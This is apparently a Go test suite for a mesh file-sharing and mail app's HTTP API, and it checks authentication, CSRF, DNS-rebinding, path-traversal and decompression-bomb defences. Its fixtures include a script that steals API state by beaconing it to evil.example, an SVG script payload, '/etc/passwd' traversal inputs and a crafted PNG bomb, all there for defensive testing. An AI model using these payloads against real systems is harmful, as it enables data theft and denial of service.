package api_test

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"hash/crc32"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"testing/fstest"
	"time"

	"github.com/parfentsevandrey-blip/test/svoi/internal/api"
	"github.com/parfentsevandrey-blip/test/svoi/internal/app"
)

type env struct {
	t   *testing.T
	app *app.App
	srv *httptest.Server
	tok string
}

func newEnv(t *testing.T) *env {
	t.Helper()
	a, err := app.Open(app.Options{Dir: t.TempDir(), DeviceName: "test-box", Owner: "tester"})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { a.Close() })
	off := false
	if _, err := a.UpdateSettings(app.SettingsPatch{STUNEnabled: &off, PortMap: &off}); err != nil {
		t.Fatal(err)
	}
	s := api.New(a, nil)
	ts := httptest.NewServer(s.Handler())
	t.Cleanup(ts.Close)
	return &env{t: t, app: a, srv: ts, tok: a.Token()}
}

func (e *env) req(method, path string, body string, mod func(*http.Request)) (*http.Response, []byte) {
	e.t.Helper()
	var r io.Reader
	if body != "" {
		r = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, e.srv.URL+path, r)
	if err != nil {
		e.t.Fatal(err)
	}
	if mod != nil {
		mod(req)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp, b
}

func (e *env) auth(req *http.Request) {
	req.Header.Set("Authorization", "Bearer "+e.tok)
	if req.Method != "GET" {
		req.Header.Set("Content-Type", "application/json")
	}
}

func (e *env) call(method, path, body string, out any) int {
	e.t.Helper()
	resp, b := e.req(method, path, body, e.auth)
	if out != nil && len(b) > 0 {
		if err := json.Unmarshal(b, out); err != nil {
			e.t.Fatalf("%s %s: bad JSON %q", method, path, b)
		}
	}
	return resp.StatusCode
}

func TestAuthenticationAndBrowserProtections(t *testing.T) {
	e := newEnv(t)

	// No credentials: nothing under /api works.
	if resp, _ := e.req("GET", "/api/state", "", nil); resp.StatusCode != 401 {
		t.Fatalf("unauthenticated request: %d", resp.StatusCode)
	}
	// A wrong token is not accepted either.
	if resp, _ := e.req("GET", "/api/state", "", func(r *http.Request) { r.Header.Set("Authorization", "Bearer nope") }); resp.StatusCode != 401 {
		t.Fatalf("wrong token: %d", resp.StatusCode)
	}
	// Signing in: a one-time code from the command line becomes an HttpOnly,
	// SameSite=Strict session cookie, and the code leaves the URL.
	status, cookie, location := e.redeem(e.mintCode())
	if status != 302 || location != "/" {
		t.Fatalf("login: %d -> %q", status, location)
	}
	if cookie == nil || !cookie.HttpOnly || cookie.SameSite != http.SameSiteStrictMode {
		t.Fatalf("session cookie: %+v", cookie)
	}
	// Neither a made-up code nor the master token opens a session.
	if status, c, _ := e.redeem("wrong"); status == 302 || c != nil {
		t.Fatal("a wrong code produced a session")
	}
	if status, c, _ := e.redeem(e.tok); status == 302 || c != nil {
		t.Fatal("the master token produced a session")
	}
	withCookie := func(r *http.Request) { r.AddCookie(cookie) }
	if resp, _ := e.req("GET", "/api/state", "", withCookie); resp.StatusCode != 200 {
		t.Fatalf("cookie auth: %d", resp.StatusCode)
	}
	// Cookie-authenticated writes need the custom header (CSRF), and a same-origin Origin.
	if resp, _ := e.req("POST", "/api/mesh/leave", "{}", withCookie); resp.StatusCode != 403 {
		t.Fatalf("POST without X-Themesh: %d", resp.StatusCode)
	}
	if resp, _ := e.req("POST", "/api/mesh/leave", "{}", func(r *http.Request) {
		withCookie(r)
		r.Header.Set("X-Themesh", "1")
		r.Header.Set("Origin", "http://evil.example")
	}); resp.StatusCode != 403 {
		t.Fatalf("cross-origin POST: %d", resp.StatusCode)
	}
	// DNS rebinding: a request whose Host is not loopback is refused.
	if resp, _ := e.req("GET", "/api/state", "", func(r *http.Request) { e.auth(r); r.Host = "attacker.example.com" }); resp.StatusCode != 421 {
		t.Fatalf("foreign Host header: %d", resp.StatusCode)
	}
	// Security headers on every response.
	resp, _ := e.req("GET", "/api/state", "", e.auth)
	for _, h := range []string{"X-Content-Type-Options", "Content-Security-Policy", "Referrer-Policy"} {
		if resp.Header.Get(h) == "" {
			t.Errorf("missing header %s", h)
		}
	}
}

func TestOnboardingAndValidation(t *testing.T) {
	e := newEnv(t)
	var st struct {
		Configured bool
		Self       struct{ ID string }
		Settings   struct{ DownloadDir, AutoAccept string }
	}
	if code := e.call("GET", "/api/state", "", &st); code != 200 || st.Configured || st.Self.ID == "" {
		t.Fatalf("fresh state: %d %+v", code, st)
	}
	// Mesh-dependent calls fail cleanly before a mesh exists.
	if code := e.call("POST", "/api/invites", `{"admin":false}`, nil); code != 412 {
		t.Fatalf("invite before mesh: %d", code)
	}
	if code := e.call("POST", "/api/mesh/join", `{"invite":"garbage"}`, nil); code != 400 {
		t.Fatalf("join with garbage: %d", code)
	}
	if code := e.call("POST", "/api/mesh/create", `{"meshName":"Home","deviceName":"Mac Book!","owner":"Ann"}`, nil); code != 200 {
		t.Fatalf("create: %d", code)
	}
	var st2 struct {
		Configured bool
		Self       struct {
			Name, Owner string
			Admin       bool
		}
	}
	e.call("GET", "/api/state", "", &st2)
	if !st2.Configured || st2.Self.Name != "mac-book" || !st2.Self.Admin {
		t.Fatalf("after create: %+v", st2)
	}
	if code := e.call("POST", "/api/mesh/create", `{"meshName":"Again"}`, nil); code == 200 {
		t.Fatal("creating a second mesh must fail")
	}
	// An invite comes with a QR code that is an SVG.
	var inv struct{ ID, Code, QRSvg string }
	if code := e.call("POST", "/api/invites", `{"admin":false,"ttlMinutes":5}`, &inv); code != 200 ||
		!strings.HasPrefix(inv.Code, "MESH1-") || !strings.HasPrefix(inv.QRSvg, "<svg") {
		t.Fatalf("invite: %d %+v", code, inv)
	}
	if code := e.call("DELETE", "/api/invites/"+inv.ID, "", nil); code != 200 {
		t.Fatalf("delete invite: %d", code)
	}
	if code := e.call("DELETE", "/api/invites/"+inv.ID, "", nil); code != 404 {
		t.Fatalf("delete twice: %d", code)
	}

	// Settings validation.
	for _, bad := range []string{
		`{"autoAccept":"sometimes"}`, `{"downloadDir":"relative/path"}`, `{"udpPort":70000}`,
		`{"stunServers":["not-a-hostport"]}`, `{"socks":{"enabled":true,"listen":"nonsense"}}`, `{"autoAcceptMaxMB":-5}`,
	} {
		if code := e.call("PUT", "/api/settings", bad, nil); code != 400 {
			t.Errorf("settings %s -> %d, want 400", bad, code)
		}
	}
	dl := filepath.Join(t.TempDir(), "dl")
	var s struct{ DownloadDir, AutoAccept string }
	if code := e.call("PUT", "/api/settings", `{"downloadDir":`+js(dl)+`,"autoAccept":"ask"}`, &s); code != 200 || s.DownloadDir != dl || s.AutoAccept != "ask" {
		t.Fatalf("valid settings: %d %+v", code, s)
	}
	// Shares: validation and CRUD.
	if code := e.call("POST", "/api/shares", `{"name":"x","path":"/definitely/not/here","mode":"ro"}`, nil); code != 400 {
		t.Fatalf("share on a missing folder: %d", code)
	}
	dir := t.TempDir()
	var sh struct {
		ID     string
		Exists bool
		Allow  []string
	}
	if code := e.call("POST", "/api/shares", `{"name":"Docs","path":`+js(dir)+`,"mode":"rw"}`, &sh); code != 200 || !sh.Exists || len(sh.Allow) != 1 || sh.Allow[0] != "*" {
		t.Fatalf("create share: %d %+v", code, sh)
	}
	if code := e.call("PUT", "/api/shares/"+sh.ID, `{"name":"Docs2","path":`+js(dir)+`,"mode":"ro","allow":["not-an-id"]}`, nil); code != 400 {
		t.Fatalf("bad allow list: %d", code)
	}
	var list []struct{ ID, Name string }
	e.call("GET", "/api/shares", "", &list)
	if len(list) != 1 || list[0].Name != "Docs" {
		t.Fatalf("shares: %+v", list)
	}
	// The folder picker lists folders only.
	os.MkdirAll(filepath.Join(dir, "sub"), 0o755)
	os.WriteFile(filepath.Join(dir, "file.txt"), []byte("x"), 0o644)
	var fsl struct {
		Path    string
		Entries []struct {
			Name  string
			IsDir bool
		}
	}
	e.call("GET", "/api/local/fs?path="+dir, "", &fsl)
	if len(fsl.Entries) != 1 || fsl.Entries[0].Name != "sub" {
		t.Fatalf("local fs: %+v", fsl)
	}
	if code := e.call("GET", "/api/local/fs?path=relative", "", nil); code != 400 {
		t.Fatalf("relative picker path: %d", code)
	}
}

// Whatever is in a shared folder, serving it must never run script in the UI's origin.
func TestFilesAreServedInertly(t *testing.T) {
	e := newEnv(t)
	e.call("POST", "/api/mesh/create", `{"meshName":"M","deviceName":"box"}`, nil)
	dir := t.TempDir()
	evil := `<html><script>fetch('/api/state').then(r=>r.text()).then(t=>navigator.sendBeacon('http://evil.example',t))</script></html>`
	os.WriteFile(filepath.Join(dir, "page.html"), []byte(evil), 0o644)
	os.WriteFile(filepath.Join(dir, "x.svg"), []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`), 0o644)
	os.WriteFile(filepath.Join(dir, "photo.png"), []byte("\x89PNG\r\n\x1a\nxxxx"), 0o644)
	var sh struct{ ID string }
	e.call("POST", "/api/shares", `{"name":"W","path":`+js(dir)+`,"mode":"ro"}`, &sh)

	get := func(name string) (*http.Response, string) {
		resp, b := e.req("GET", "/api/peers/self/file?share="+sh.ID+"&path=/"+name, "", e.auth)
		return resp, string(b)
	}
	resp, body := get("page.html")
	if ct := resp.Header.Get("Content-Type"); !strings.HasPrefix(ct, "text/plain") {
		t.Fatalf("HTML served as %q", ct)
	}
	if body != evil {
		t.Fatalf("content altered: %q", body)
	}
	csp := resp.Header.Get("Content-Security-Policy")
	if !strings.Contains(csp, "sandbox") || !strings.Contains(csp, "default-src 'none'") || resp.Header.Get("X-Content-Type-Options") != "nosniff" {
		t.Fatalf("missing hardening headers: %q", csp)
	}
	// SVG stays an image (for <img>), but with the sandbox policy script cannot run when opened directly.
	resp, _ = get("x.svg")
	if resp.Header.Get("Content-Type") != "image/svg+xml" || !strings.Contains(resp.Header.Get("Content-Security-Policy"), "sandbox") {
		t.Fatalf("svg headers: %v", resp.Header)
	}
	// Path traversal does not escape.
	if resp, b := get("../../../../etc/passwd"); resp.StatusCode == 200 && strings.Contains(string(b), "root:") {
		t.Fatal("path traversal leaked /etc/passwd")
	}
	// Range requests work and download mode sets a safe disposition.
	req, _ := http.NewRequest("GET", e.srv.URL+"/api/peers/self/file?share="+sh.ID+"&path=/photo.png&dl=1", nil)
	req.Header.Set("Authorization", "Bearer "+e.tok)
	req.Header.Set("Range", "bytes=1-3")
	r2, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	b2, _ := io.ReadAll(r2.Body)
	r2.Body.Close()
	if r2.StatusCode != 206 || string(b2) != "PNG" || !strings.HasPrefix(r2.Header.Get("Content-Disposition"), "attachment") {
		t.Fatalf("range: %d %q %q", r2.StatusCode, b2, r2.Header.Get("Content-Disposition"))
	}
	// Uploads into a read-only share are refused.
	if resp, _ := e.req("PUT", "/api/peers/self/file?share="+sh.ID+"&path=/new.txt", "data", e.auth); resp.StatusCode != 403 {
		t.Fatalf("upload to a read-only share: %d", resp.StatusCode)
	}
}

func TestMailChatAndBlobsLocally(t *testing.T) {
	e := newEnv(t)
	e.call("POST", "/api/mesh/create", `{"meshName":"M","deviceName":"box"}`, nil)
	// A note to self goes straight to the inbox.
	var id struct{ ID string }
	var me struct{ Self struct{ ID string } }
	e.call("GET", "/api/state", "", &me)
	if code := e.call("POST", "/api/mail", `{"to":["self"],"subject":"todo","body":"buy milk"}`, &id); code != 200 {
		t.Fatalf("send: %d", code)
	}
	var inbox struct {
		Items []struct{ ID, Subject string }
		Total int
	}
	e.call("GET", "/api/mail?folder=inbox&q=milk", "", &inbox)
	if inbox.Total != 1 || inbox.Items[0].ID != id.ID {
		t.Fatalf("inbox: %+v", inbox)
	}
	if code := e.call("POST", "/api/mail", `{"to":[],"body":"x"}`, nil); code != 400 {
		t.Fatalf("no recipients: %d", code)
	}
	// Attachments: upload a blob, attach it, download it back.
	resp, body := e.req("POST", "/api/blobs?name=hello%20world.txt&mime=text/plain", "hello blob", func(r *http.Request) { e.auth(r); r.Header.Set("Content-Type", "application/octet-stream") })
	var blob struct {
		ID, Name string
		Size     int
	}
	json.Unmarshal(body, &blob)
	if resp.StatusCode != 200 || blob.Size != 10 || blob.Name != "hello world.txt" {
		t.Fatalf("blob upload: %d %s", resp.StatusCode, body)
	}
	var id2 struct{ ID string }
	e.call("POST", "/api/mail", `{"to":["self"],"subject":"file","body":"see","attachments":["`+blob.ID+`"]}`, &id2)
	resp, got := e.req("GET", "/api/mail/"+id2.ID+"/attachments/0?dl=1", "", e.auth)
	if resp.StatusCode != 200 || string(got) != "hello blob" {
		t.Fatalf("attachment: %d %q", resp.StatusCode, got)
	}
	// Trash then delete for good.
	e.call("POST", "/api/mail/"+id.ID+"/flags", `{"folder":"trash"}`, nil)
	e.call("GET", "/api/mail?folder=trash", "", &inbox)
	if inbox.Total != 1 {
		t.Fatalf("trash: %+v", inbox)
	}
	e.call("DELETE", "/api/mail/"+id.ID, "", nil)
	if code := e.call("GET", "/api/mail/"+id.ID, "", nil); code != 404 {
		t.Fatalf("deleted message still readable: %d", code)
	}
}

func TestRemoteAdminRequiresAdminAndAllowlist(t *testing.T) {
	e := newEnv(t)
	e.call("POST", "/api/mesh/create", `{"meshName":"M","deviceName":"box"}`, nil)
	// "Remote" management of this very device runs locally and is allowed...
	if code := e.call("GET", "/api/d/self/settings", "", nil); code != 200 {
		t.Fatalf("/api/d/self/settings: %d", code)
	}
	// ...but only for configuration endpoints.
	for _, p := range []string{"/api/d/self/mail", "/api/d/self/transfers", "/api/d/self/mesh/leave", "/api/d/self/shares/../mail"} {
		if code := e.call("GET", p, "", nil); code != 403 {
			t.Errorf("%s -> %d, want 403", p, code)
		}
	}
	// An unknown or offline device is reported as such.
	if code := e.call("GET", "/api/d/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/settings", "", nil); code != 404 {
		t.Fatalf("unknown device: %d", code)
	}
}

func TestEventStream(t *testing.T) {
	e := newEnv(t)
	e.call("POST", "/api/mesh/create", `{"meshName":"M","deviceName":"box"}`, nil)
	req, _ := http.NewRequest("GET", e.srv.URL+"/api/events", nil)
	req.Header.Set("Authorization", "Bearer "+e.tok)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	resp, err := http.DefaultClient.Do(req.WithContext(ctx))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if ct := resp.Header.Get("Content-Type"); ct != "text/event-stream" {
		t.Fatalf("content type %q", ct)
	}
	buf := make([]byte, 512)
	n, _ := resp.Body.Read(buf)
	if !strings.Contains(string(buf[:n]), "event: hello") {
		t.Fatalf("no hello event: %q", buf[:n])
	}
	// A change shows up on the stream.
	go e.app.Hub().Publish("notify", map[string]string{"level": "info", "title": "t", "text": "x"})
	got := ""
	for i := 0; i < 5 && !strings.Contains(got, "event: notify"); i++ {
		n, err := resp.Body.Read(buf)
		got += string(buf[:n])
		if err != nil {
			break
		}
	}
	if !strings.Contains(got, "event: notify") {
		t.Fatalf("event not delivered: %q", got)
	}
}

// The embedded interface must open at "/" without redirect loops (http.FileServer
// redirects index.html to "./"), and must not expose directory listings.
func TestStaticInterface(t *testing.T) {
	a, err := app.Open(app.Options{Dir: t.TempDir(), DeviceName: "ui-box"})
	if err != nil {
		t.Fatal(err)
	}
	defer a.Close()
	ui := fstest.MapFS{
		"index.html":   {Data: []byte("<!doctype html><title>themesh</title>")},
		"js/app.js":    {Data: []byte("console.log(1)")},
		"css/main.css": {Data: []byte("body{}")},
	}
	ts := httptest.NewServer(api.New(a, ui).Handler())
	defer ts.Close()
	noFollow := &http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	get := func(path string) (*http.Response, string) {
		resp, err := noFollow.Get(ts.URL + path)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		return resp, string(b)
	}
	for _, p := range []string{"/", "/index.html"} {
		resp, body := get(p)
		if resp.StatusCode != 200 || !strings.Contains(body, "<title>themesh</title>") || !strings.HasPrefix(resp.Header.Get("Content-Type"), "text/html") {
			t.Errorf("GET %s: %d %q %q", p, resp.StatusCode, resp.Header.Get("Content-Type"), body)
		}
	}
	if resp, body := get("/js/app.js"); resp.StatusCode != 200 || body != "console.log(1)" || !strings.Contains(resp.Header.Get("Content-Type"), "javascript") {
		t.Errorf("js: %d %q %q", resp.StatusCode, resp.Header.Get("Content-Type"), body)
	}
	if resp, _ := get("/css/main.css"); resp.StatusCode != 200 || !strings.HasPrefix(resp.Header.Get("Content-Type"), "text/css") {
		t.Errorf("css: %d %q", resp.StatusCode, resp.Header.Get("Content-Type"))
	}
	for _, p := range []string{"/js", "/js/", "/nope.js", "/../etc/passwd"} {
		if resp, _ := get(p); resp.StatusCode == 200 {
			t.Errorf("GET %s unexpectedly succeeded", p)
		}
	}
	// The API stays behind the token even though the page itself is public.
	if resp, _ := get("/api/state"); resp.StatusCode != 401 {
		t.Errorf("/api/state without credentials: %d", resp.StatusCode)
	}
}

// A share that would expose themesh's own keys and settings (the folder that holds
// them, one of its parents such as the home folder, or something inside it) is
// refused when saved.
func TestSharingTheDataFolderIsRefused(t *testing.T) {
	root := t.TempDir()
	data := filepath.Join(root, "home", ".config", "themesh")
	a, err := app.Open(app.Options{Dir: data, DeviceName: "keys-box", Owner: "tester"})
	if err != nil {
		t.Fatal(err)
	}
	defer a.Close()
	ts := httptest.NewServer(api.New(a, nil).Handler())
	defer ts.Close()
	e := &env{t: t, app: a, srv: ts, tok: a.Token()}
	e.call("POST", "/api/mesh/create", `{"meshName":"M","deviceName":"keys-box"}`, nil)
	os.MkdirAll(filepath.Join(data, "blobs"), 0o755)
	for _, p := range []string{data, filepath.Join(data, "blobs"), filepath.Join(root, "home"), root} {
		var out struct {
			Error struct{ Code, Message string }
		}
		code := e.call("POST", "/api/shares", `{"name":"x","path":`+js(p)+`,"mode":"ro"}`, &out)
		if code != 400 || !strings.Contains(out.Error.Message, "keys") {
			t.Errorf("sharing %s: %d %+v", p, code, out)
		}
	}
	ok := t.TempDir()
	if code := e.call("POST", "/api/shares", `{"name":"fine","path":`+js(ok)+`,"mode":"ro"}`, nil); code != 200 {
		t.Errorf("an unrelated folder was refused: %d", code)
	}
}

// A tiny PNG that declares a huge canvas must not be decoded for a thumbnail
// (it used to allocate gigabytes and take the node down).
func TestThumbnailRefusesDecompressionBombs(t *testing.T) {
	e := newEnv(t)
	e.call("POST", "/api/mesh/create", `{"meshName":"M","deviceName":"box"}`, nil)
	dir := t.TempDir()
	// PNG signature + IHDR 40000x40000 (8-bit grayscale), a truncated IDAT and IEND: ~100 bytes.
	var png bytes.Buffer
	png.WriteString("\x89PNG\r\n\x1a\n")
	chunk := func(typ string, data []byte) {
		binary.Write(&png, binary.BigEndian, uint32(len(data)))
		body := append([]byte(typ), data...)
		png.Write(body)
		binary.Write(&png, binary.BigEndian, crc32.ChecksumIEEE(body))
	}
	ihdr := make([]byte, 13)
	binary.BigEndian.PutUint32(ihdr[0:], 40000)
	binary.BigEndian.PutUint32(ihdr[4:], 40000)
	ihdr[8], ihdr[9] = 8, 0
	chunk("IHDR", ihdr)
	chunk("IDAT", []byte{0x78, 0x9c, 0x63, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01})
	chunk("IEND", nil)
	os.WriteFile(filepath.Join(dir, "bomb.png"), png.Bytes(), 0o644)
	var sh struct{ ID string }
	e.call("POST", "/api/shares", `{"name":"W","path":`+js(dir)+`,"mode":"ro"}`, &sh)

	var before, after runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&before)
	resp, _ := e.req("GET", "/api/peers/self/thumb?share="+sh.ID+"&path=/bomb.png&w=256", "", e.auth)
	runtime.ReadMemStats(&after)
	if resp.StatusCode != 404 {
		t.Fatalf("thumbnail of a bomb: %d", resp.StatusCode)
	}
	if grown := after.TotalAlloc - before.TotalAlloc; grown > 200<<20 {
		t.Fatalf("the bomb made the node allocate %d MB", grown>>20)
	}
}

// The service worker names its cache after the interface it ships with, so a new
// binary replaces what a browser kept instead of showing yesterday's files first.
func TestServiceWorkerCacheFollowsTheInterface(t *testing.T) {
	a, err := app.Open(app.Options{Dir: t.TempDir(), DeviceName: "sw-box"})
	if err != nil {
		t.Fatal(err)
	}
	defer a.Close()
	sw := `const VERSION = "themesh-ui-v1";
self.addEventListener("install", () => {});`
	version := func(files fstest.MapFS) string {
		ts := httptest.NewServer(api.New(a, files).Handler())
		defer ts.Close()
		resp, err := http.Get(ts.URL + "/sw.js")
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(resp.Body)
		if resp.StatusCode != 200 || !strings.Contains(resp.Header.Get("Content-Type"), "javascript") {
			t.Fatalf("sw.js: %d %q", resp.StatusCode, resp.Header.Get("Content-Type"))
		}
		body := string(b)
		i := strings.Index(body, `const VERSION = "themesh-ui-`)
		if i < 0 || strings.Contains(body, `"themesh-ui-v1"`) || !strings.Contains(body, `self.addEventListener("install"`) {
			t.Fatalf("the cache name was not tied to the interface:\n%s", body)
		}
		return body[i : i+len(`const VERSION = "themesh-ui-`)+12]
	}
	v1 := version(fstest.MapFS{"index.html": {Data: []byte("a")}, "js/app.js": {Data: []byte("one")}, "sw.js": {Data: []byte(sw)}})
	same := version(fstest.MapFS{"sw.js": {Data: []byte(sw)}, "js/app.js": {Data: []byte("one")}, "index.html": {Data: []byte("a")}})
	changed := version(fstest.MapFS{"index.html": {Data: []byte("a")}, "js/app.js": {Data: []byte("two")}, "sw.js": {Data: []byte(sw)}})
	if v1 != same {
		t.Fatalf("the same interface got two versions: %q %q", v1, same)
	}
	if v1 == changed {
		t.Fatal("a changed interface kept its cache name")
	}
	// Without a service worker there is simply nothing to serve.
	ts := httptest.NewServer(api.New(a, fstest.MapFS{"index.html": {Data: []byte("a")}}).Handler())
	defer ts.Close()
	if resp, _ := http.Get(ts.URL + "/sw.js"); resp.StatusCode != 404 {
		t.Fatalf("sw.js when there is none: %d", resp.StatusCode)
	}
}

// Close may arrive while Serve is still starting up in its goroutine (the demo
// does exactly that when one of its devices fails to come up): no data race, no
// leaked listener, and Serve returns.
func TestCloseRightAfterServeIsSafe(t *testing.T) {
	a, err := app.Open(app.Options{Dir: t.TempDir(), DeviceName: "close-box"})
	if err != nil {
		t.Fatal(err)
	}
	defer a.Close()
	for i := 0; i < 100; i++ {
		s := api.New(a, nil)
		ln, err := s.Listen("127.0.0.1:0", true)
		if err != nil {
			t.Fatal(err)
		}
		done := make(chan struct{})
		go func() { s.Serve(ln); close(done) }()
		s.Close()
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			t.Fatal("Serve did not return after Close")
		}
		if c, err := net.DialTimeout("tcp", ln.Addr().String(), 200*time.Millisecond); err == nil {
			c.Close()
			t.Fatal("the port is still listening after Close")
		}
	}
}

// Asking the router to forward our port is a setting (on by default, off here
// for the tests) and shows up in the device's own description.
func TestPortMapSettingAndStatus(t *testing.T) {
	e := newEnv(t)
	e.call("POST", "/api/mesh/create", `{"meshName":"M","deviceName":"pm-box"}`, nil)
	var set struct{ PortMap bool }
	if code := e.call("GET", "/api/settings", "", &set); code != 200 || set.PortMap {
		t.Fatalf("settings: %d portMap=%v (the harness switched it off)", code, set.PortMap)
	}
	type self struct {
		Self struct {
			PortMap *struct{ State string } `json:"portmap"`
		}
	}
	var st self
	e.call("GET", "/api/state", "", &st)
	if st.Self.PortMap != nil {
		t.Fatalf("a switched-off port mapping must not be reported: %+v", st.Self.PortMap)
	}
	if code := e.call("PUT", "/api/settings", `{"portMap":true}`, &set); code != 200 || !set.PortMap {
		t.Fatalf("enabling: %d %+v", code, set)
	}
	waitUntil(t, "the mapper to report a state", func() bool {
		st = self{}
		e.call("GET", "/api/state", "", &st)
		return st.Self.PortMap != nil && st.Self.PortMap.State != ""
	})
	if code := e.call("PUT", "/api/settings", `{"portMap":false}`, &set); code != 200 || set.PortMap {
		t.Fatalf("disabling: %d %+v", code, set)
	}
	waitUntil(t, "the report to go away", func() bool {
		st = self{}
		e.call("GET", "/api/state", "", &st)
		return st.Self.PortMap == nil
	})
}

func waitUntil(t *testing.T, what string, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		if cond() {
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for %s", what)
}

// js is s as a JSON string: a path on Windows has backslashes in it.
func js(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}
